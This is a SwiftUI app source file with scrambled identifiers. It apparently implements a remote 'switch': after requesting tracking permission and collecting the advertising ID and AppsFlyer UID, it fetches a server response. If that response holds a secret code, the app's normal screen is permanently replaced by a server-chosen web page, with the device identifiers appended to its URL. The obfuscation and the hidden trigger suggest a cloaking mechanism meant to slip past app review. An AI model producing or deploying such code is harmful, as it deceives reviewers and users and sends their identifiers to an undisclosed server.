import SwiftUI
import AdSupport
import AppTrackingTransparency
import AppsFlyerLib

enum oquisik9: Int, CaseIterable {
    case none = 0
    case s91wczl7 = 1
    case ncwvz0ri = 2
}

struct xeqwbje1: View {
    @State private var apbts8hn: URL? = UserDefaults.standard.url(forKey: "savedWebViewURL")
    @State private var isLoading: Bool = true
    @State private var jl56aivf: String = ""
    @State private var zkcanaob: String = ""
    @State private var mj2ir0k4: Bool = false
    @State private var ic7v4j3c: String? = nil
    @State private var vz58a0os: oquisik9 = UserDefaults.standard.object(forKey: "savedNavigationMode") != nil ? oquisik9(rawValue: UserDefaults.standard.integer(forKey: "savedNavigationMode")) ?? .none : .none

    var body: some View {
        Group {
            if let url = apbts8hn {
                zestp4m0(url: url, vz58a0os: vz58a0os) { qxiswiqn in
                   
                    if UserDefaults.standard.url(forKey: "savedWebViewURL") == nil {
                        UserDefaults.standard.set(qxiswiqn, forKey: "savedWebViewURL")
                    }
                }
            } else if !mj2ir0k4 {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    Image(rjqefzvk)
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: bjlao9aw, height: bjlao9aw)
                        .cornerRadius(pu6zms82)
                }
            } else if isLoading {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    
                    Image(rjqefzvk)
                        .resizable()
                        .aspectRatio(contentMode: .fit)
                        .frame(width: bjlao9aw, height: bjlao9aw)
                        .cornerRadius(pu6zms82)
                }
            } else {
                ContentView()
            }
        }
        .onAppear {
            if apbts8hn == nil {
               
                DispatchQueue.main.asyncAfter(deadline: .now() + jghgkbwr) {
                    bidgawxh()
                }
            }
            
            
        }
    }

    private func bidgawxh() {
        // Сначала запрашиваем разрешение на трекинг
        ATTrackingManager.requestTrackingAuthorization { status in
            DispatchQueue.main.async {
                // Получаем IDFA после ответа пользователя
                switch status {
                case .authorized:
                    self.jl56aivf = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                default:
                    self.jl56aivf = "00000000-0000-0000-0000-000000000000"
                }
                
                // Теперь запускаем AppsFlyer с известным IDFA
                self.startAppsFlyerAndFetchURL()
            }
        }
    }
    
    private func startAppsFlyerAndFetchURL() {
        // Инициализируем AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = ebmwitio
        AppsFlyerLib.shared().appleAppID = efvgjx6m
        AppsFlyerLib.shared().isDebug = false
        AppsFlyerLib.shared().delegate = AppsFlyerManager.shared
        
        AppsFlyerLib.shared().start()
        
        // Дополнительный старт для authorized статуса
        if ATTrackingManager.trackingAuthorizationStatus == .authorized {
            DispatchQueue.main.asyncAfter(deadline: .now() + os8cnlv0) {
                let isTrackingEnabled = ASIdentifierManager.shared().isAdvertisingTrackingEnabled
                if isTrackingEnabled {
                    AppsFlyerLib.shared().start()
                }
            }
        }
        
        zkcanaob = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
        mj2ir0k4 = true

        AppsFlyerManager.shared.deme59ii { params in
            ic7v4j3c = params
            vh5b58p0()
            xxlwckfj = true
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + in4o3fbr) {
            if !xxlwckfj {
                vh5b58p0()
            }
        }
    }

    private func vh5b58p0() {
        guard let url = URL(string: b0gj6j0s) else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            return
        }
        
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10.0
        config.timeoutIntervalForResource = 15.0
        
        let session = URLSession(configuration: config)
        
        let dogrqali = DispatchWorkItem {
            DispatchQueue.main.async {
                if self.isLoading {
                    print("Timeout: vh5b58p0 took too long")
                    self.isLoading = false
                }
            }
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 20, execute: dogrqali)
        
        session.dataTask(with: url) { data, response, error in
            DispatchQueue.main.async {
                dogrqali.cancel()
                
                defer { 
                    self.isLoading = false
                }
                
                if let error = error {
                    print("Network error: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    guard 200...299 ~= httpResponse.statusCode else {
                        print("HTTP error: \(httpResponse.statusCode)")
                        return
                    }
                }
                
                guard let data = data,
                      let text = String(data: data, encoding: .utf8) else {
                    print("Invalid data received")
                    return
                }
                
                if text.contains(pzpnvkuc) {
                    var t7n0d2iz: oquisik9 = .none
                    
                    if text.contains("|enabled=1") {
                        t7n0d2iz = .s91wczl7
                    } else if text.contains("|enabled=2") {
                        t7n0d2iz = .ncwvz0ri
                    }
                    
                    var byawwhhs = text
                    byawwhhs = byawwhhs.replacingOccurrences(of: "|enabled=1", with: "")
                    byawwhhs = byawwhhs.replacingOccurrences(of: "|enabled=2", with: "")
                    
                    var qxiswiqn = byawwhhs + "?idfa=\(self.jl56aivf)&gaid=\(self.zkcanaob)"
                    if let params = self.ic7v4j3c {
                        qxiswiqn += params
                    }
                    
                    if let url = URL(string: qxiswiqn) {
                        self.vz58a0os = t7n0d2iz
                        self.apbts8hn = url
                        
                        UserDefaults.standard.set(t7n0d2iz.rawValue, forKey: "savedNavigationMode")
                    } else {
                        print("Failed to create URL from: \(qxiswiqn)")
                    }
                } else {
                    print("Response doesn't contain required code")
                }
            }
        }.resume()
    }
}
